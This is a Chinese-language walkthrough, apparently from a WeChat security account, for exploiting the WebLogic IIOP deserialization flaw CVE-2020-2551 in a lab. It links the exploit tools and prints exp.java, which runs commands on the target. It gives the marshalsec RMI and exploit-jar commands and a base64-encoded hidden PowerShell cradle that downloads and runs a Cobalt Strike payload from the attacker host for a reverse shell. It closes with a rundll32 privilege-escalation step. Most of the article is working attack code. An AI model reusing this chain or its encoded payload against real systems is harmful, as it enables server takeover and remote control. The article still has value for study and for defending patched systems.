> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iXIdSm0G-2r2J1t-cmBskA)

Weblogic CVE-2020-2551 漏洞复现
===========================

Weblogic IIOP 反序列化

漏洞原理
----

https://www.anquanke.com/post/id/199227#h3-7 https://www.cnblogs.com/tr1ple/p/12483235.html

漏洞复现
----

Weblogic CVE-2020-2551 复现过程

靶机：windows7 系统 

IP 地址：192.168.43.20 

攻击机：windows10 系统

IP 地址：192.168.43.38

• 工具下载地址 https://pan.baidu.com/s/1N9oW3PtJJpkGC-W-LkgW9A 提取码：03vx

```
exp.java
marshalsec-0.0.3-SNAPSHOT-all.jar
weblogic_CVE_2020_2551.jar
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9Qb66ATunFYKC6mKEU6pHKS4hNXVE1YoSblUHfcVBUmuSPpb6DpZOrSGQ/640?wx_fmt=png)

*   exp.java 源代码
    

```
import java.io.IOException;
public class exp {
  static{
    try {
      java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  public static void main(String[] args) {
    
  }
}
```

*   1、在 exp.java 中修改执行的命令，编译生成 exp.class
    

```
javac exp.java -source 1.6 -target 1.6
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbfJJcm6orUZScjxgfHqFBPRicTj9dyBfibG4e9ZdIE6gEDlCaDMVVxpng/640?wx_fmt=png)

*   2、用 python 启动一个 web 服务，需要与 exp.class 在同一文件夹
    

```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbicqnKCoQBwicnI5A8bt8yq79SQkhbSF4iacy3EIHstrTYibOxPVicHOGdWg/640?wx_fmt=png)

*   3、使用 marshalsec 起一个恶意的 RMI 服务
    

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.43.38/#exp" 1099
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9Qbt8Mic4nEQLuc0EA5eRY2E9uaPbZyChxbUHNLH7VuYiarkdajhib6Fa4mA/640?wx_fmt=png)

*   4、利用漏洞攻击使目标弹出计算器
    

```
java -jar weblogic_CVE_2020_2551.jar 192.168.43.20 7001 rmi://192.168.43.38:1099/exp
//java -jar weblogic_CVE_2020_2551.jar 靶机IP地址 靶机端口 RMI服务
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbLQ7fR58eavWroT5oTCictFQolV96sgbAOibXoyghoic0TiamkdALynqOdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbxyavQiaZbj7UVlNDbRAic8wYicVE1yqiabzw4EcjcuVapFnqqrDzwcZYFQ/640?wx_fmt=png)

Cobalt strike 工具实战利用
--------------------

**反弹 sehll**
------------

1、启动 cs 团队服务器、客户端，生成 powershell 运行后门命令

*   2、修改 powershell
    

Runtime.getRuntime().exec() 函数解决

http://www.jackson-t.ca/runtime-exec-payloads.html

详情见 Apache Shiro 反序列化漏洞复现（CVE-2016-4437）

https://www.cnblogs.com/renhaoblog/p/12971152.html

*   3、编写 exp.class 脚本
    

```
import java.io.IOException;
public class exp {
  static{
    try {
      java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADMALgAxADMAOAA6ADgAMAAvAGEAJwApACkAIgA="});
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  public static void main(String[] args) {
    
  }
}
```

•4、利用 weblogic CVE-2020-2551 漏洞反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbxickEczVgk4hKyj9eQpXb7jW4lucTKVUy38s0RQ7e5SAA1p9B7icfficg/640?wx_fmt=png)

rundll32.exe 提权
---------------

•1、遇到创建用户失败，利用 rundll32.exe 进行用户提权

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbjTU8QWFytwshwtOeIicx8PHBicFibHBWU4guDXTdX5m6kKxIJUg604L0Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9Qbg3OGSW4nWNcqOcqpticPyvDlE1ibk14N8eq7fGjuhibOJYzwr90HyUjOA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9QbE7aNUkHicnHV7LIgFnZibibcib2As9tO7pyJibN8z51uMzKaUv02IHywlbw/640?wx_fmt=png)

•2、用户创建成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicRn6mGXVe7pH8kag17J9Qb6MicDDAricWBrYEzAAGHc2wTvplPoGicoau2tlekGo5BQezSL66PeAYcw/640?wx_fmt=png)

参考链接
====

Weblogic CVE-2020-2551 复现

https://blog.csdn.net/weixin_44677409/article/details/106493733

声明
==

严禁读者利用以上介绍知识点对网站进行非法操作 , 本文仅用于技术交流和学习 , 如果您利用文章中介绍的知识对他人造成损失 , 后果由您自行承担 

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou80h6Jor7Py4sKIwfiaowozsMP0Yjn9RcoJAmPMKa5hQVczeXoDxIic2QaZYKKrLDlJFT5v6EpREmjg/640?wx_fmt=png)

**点赞，转发，在看**

原创投稿作者：renbao

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)